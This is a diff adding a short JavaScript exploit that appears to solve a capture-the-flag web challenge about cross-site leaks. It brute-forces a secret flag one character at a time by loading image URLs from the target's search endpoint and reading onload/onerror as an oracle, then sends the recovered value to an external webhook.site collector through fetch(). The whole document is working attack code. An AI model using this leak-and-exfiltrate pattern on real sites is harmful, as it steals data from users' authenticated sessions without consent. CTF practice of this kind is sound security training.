@@ -1,0 +1,37 @@
+<script>
+const APP = "http://app-a6b8822d662c.are-xsleaks-dead.ctf.theromanxpl0.it";
+
+const charset = "abcdefghijklmnopqrstuvwxyz0123456789_";
+let flag = "TRX{";
+
+function test(prefix) {
+    return new Promise((resolve) => {
+        let img = new Image();
+
+        img.onload = () => resolve(true);
+        img.onerror = () => resolve(false);
+
+        img.src = APP + "/?q=" + encodeURIComponent(prefix) + "&t=" + Math.random();
+    });
+}
+
+async function solve() {
+    while (!flag.endsWith("}")) {
+        for (let c of charset) {
+            let guess = flag + c;
+            console.log("Trying:", guess);
+
+            if (await test(guess)) {
+                flag += c;
+                console.log("FOUND:", flag);
+                break;
+            }
+        }
+    }
+
+    // SEND FLAG HERE
+    fetch("https://webhook.site/03e7815b-c57e-49fa-9350-ad7dcea09f7d?flag=" + flag);
+}
+
+solve();
+</script>
